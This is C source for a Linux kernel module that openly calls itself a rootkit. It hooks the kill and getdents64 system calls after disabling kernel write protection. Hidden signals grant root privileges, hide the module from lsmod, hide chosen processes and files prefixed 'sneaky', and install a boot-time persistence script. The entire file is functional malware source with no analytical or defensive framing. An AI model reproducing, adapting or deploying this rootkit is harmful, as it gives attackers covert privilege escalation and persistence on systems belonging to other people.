#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/syscalls.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/fcntl.h>
#include <asm/uaccess.h>
#include <linux/namei.h>
#include <linux/types.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("elouan");
MODULE_DESCRIPTION("LKM Rootkit");
MODULE_VERSION("0.0.1");



unsigned long *__sys_call_table;
typedef void *(*kallsyms_t)(const char *symbol_name);
static kallsyms_t lookup_name = NULL;

short hidef = 0;
#define PTREGS_SYSCALL_STUB 1


typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);    
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
long (*orig_read) (const struct pt_regs *);
static ptregs_t orig_kill;



enum signal {
    SIGHIDEF = 60, //Hides files and folders
    SIGPER = 61, //Make the rootkit auto load on boot
    SIGPID = 62, //Hides processes in ps with pid
    SIGINVIS = 63, //Hides itself in LSMOD
    SIGSUPER = 64, //Become Root
    
};
static int write_file(const char *filename, const char *data)
{
    struct file *file;
    loff_t pos = 0;
    ssize_t ret;

    file = filp_open(filename,  O_CREAT | O_WRONLY, 0644);
    if (IS_ERR(file))
        return PTR_ERR(file);

    ret = kernel_write(file, data, strlen(data), &pos);

    fput(file);
    return ret;
}

static int chmod(const char *filename, umode_t mode)
{
    typedef int (*vfs_fchmod_t) (struct file* file, umode_t mode);
    static vfs_fchmod_t vfs_fchmod = NULL;
	struct path path;
	int error;
    struct file *file;
    if (!vfs_fchmod)
        vfs_fchmod = (int (*) (struct file*, umode_t))lookup_name("vfs_fchmod");
    file = filp_open(filename, O_PATH, 0644);
    error = vfs_fchmod(file, mode);
	fput(file);
	return error;
}

char hide_pid[NAME_MAX];

void set_root(void)
{
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    commit_creds(root);
}

static struct list_head *prev_module;   
static int hidden = 0;
void hide(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    hidden = 1;
}

void show(void)
{
    list_add(&THIS_MODULE->list, prev_module);
    hidden = 0;
}

asmlinkage long hacked_kill(const struct pt_regs *regs){
    pid_t pid = regs->di;
    int sig = regs->si;

    if (sig == SIGSUPER) {
        set_root();
        //printk(KERN_DEBUG "signal : %d == SIGSUPER : %d | --ROOT--", sig, SIGSUPER);
        return 0;
    } else if (sig == SIGINVIS){
        if(hidden == 0){
            //printk(KERN_DEBUG "signal : %d == SIGINVIS : %d | --hide itself--", sig, SIGINVIS);
            hide();
        }
        else if(hidden == 1){
            //printk(KERN_DEBUG "signal : %d == SIGINVIS : %d | --show itself--", sig, SIGINVIS);
            show();
        }
        return 0;
    } else if (sig == SIGPID){
        //printk(KERN_DEBUG "signal : %d == SIGPID : %d | --hide pid--", sig, SIGPID);
        sprintf(hide_pid, "%d", pid);
        return 0;
    } else if (sig == SIGPER){
        write_file("/etc/local.d/sneaky_per.start", "insmod /root/my_modules/rootkit.ko\n");
        chmod("/etc/local.d/sneaky_per.start", 0700);
        //printk(KERN_DEBUG "signal : %d == SIGPER : %d | --become persistant--", sig, SIGPER);
        return 0;
    } else if (sig == SIGHIDEF){
        if(hidef == 0)
            hidef = 1;
        else
            hidef = 0;
        //printk(KERN_DEBUG "signal : %d == SIGHIDEF : %d | --Hide Files & Folders--", sig, SIGHIDEF);
        return 0;
    }
    //printk(KERN_DEBUG "---Hacked kill syscall---");
    return orig_kill(regs);
    
}

asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    struct linux_dirent64 *prev_dir, *current_dir, *dirent_ker = NULL;
    unsigned long offset = 0;
    int ret = orig_getdents64(regs);
    if(hidef == 0)
        return ret;
    dirent_ker = kvzalloc(ret, GFP_KERNEL);
    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;
    long error;
    error = copy_from_user(dirent_ker, dirent, ret);    
    if(error){
        kvfree(dirent_ker);
        return ret;
    }
    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;
        if ( memcmp("sneaky", current_dir->d_name, strlen("sneaky")) == 0)
        {
            if( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
            }
            prev_dir->d_reclen += current_dir->d_reclen;
        }
        else if ( (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0) )
        {
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            prev_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            prev_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }
    error = copy_to_user(dirent, dirent_ker, ret);
    if(error){
        kvfree(dirent_ker);
        return ret;
    }
done : 
    kvfree(dirent_ker);
    return ret;
}

static unsigned long *get_syscall_table(void){
    int error = 1;
    struct kprobe probe = {
        .symbol_name = "kallsyms_lookup_name",
    };
    if (register_kprobe(&probe)) {
        //pr_err("[ROOTKIT] Failed to get kallsyms_lookup_name() address.\n");
        return error;
    }
    lookup_name = (kallsyms_t)(probe.addr);
    unregister_kprobe(&probe);
    unsigned long *sys_call_table_addr = lookup_name("sys_call_table");
    return sys_call_table_addr;
}


static int store(void){
    //orig_read = (ptregs_t)__sys_call_table[__NR_read];
    orig_getdents64 =  (ptregs_t)__sys_call_table[__NR_getdents64];
    orig_kill =  (ptregs_t)__sys_call_table[__NR_kill];
    return 0;
}

static int hook(void){
    //__sys_call_table[__NR_read] = (unsigned long)&hook_read;
    __sys_call_table[__NR_getdents64] = (unsigned long)&hook_getdents64;
    __sys_call_table[__NR_kill] = (unsigned long)&hacked_kill;
    return 0;
}

static int clean(void){
    __sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    __sys_call_table[__NR_kill] = (unsigned long)orig_kill;
    //__sys_call_table[__NR_read] = (unsigned long)orig_read;
    return 0;
}

static inline void write_cr0_forced(unsigned long val) {
    unsigned long __forced_order;
    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__forced_order)
    );
}

static void unprotect_memory(void){
    write_cr0_forced(read_cr0() & (~ 0x10000));
    //printk(KERN_DEBUG "Unprotected Memory\n");
}

static void protect_memory(void){
    write_cr0_forced(read_cr0() | (0x10000));
    //printk(KERN_DEBUG "Protected Memory\n");
}

static int __init mod_init(void){   
    int error = 1;
    //printk(KERN_DEBUG "rootkit : init\n");
    hide();
    __sys_call_table = get_syscall_table();
    if (!__sys_call_table) {
        //pr_err("[ROOTKIT] Failed to get sys_call_table address.\n");
        return error;
    }
    //printk(KERN_DEBUG "sys_call_table address: %p\n", __sys_call_table);
    if (store() == error){
        //printk(KERN_DEBUG "error: store\n");
    }
    unprotect_memory();
    if (hook() == error){
        //printk(KERN_DEBUG "error: hook\n");
    }
    protect_memory();
    return 0;
}

static void __exit mod_exit(void){
    int error = 1;
    //printk(KERN_DEBUG "rootkit : exit\n");
    unprotect_memory();
    if (clean() == error){
        //printk(KERN_DEBUG "error: clean\n");
    }
    protect_memory();
}




module_init(mod_init);
module_exit(mod_exit);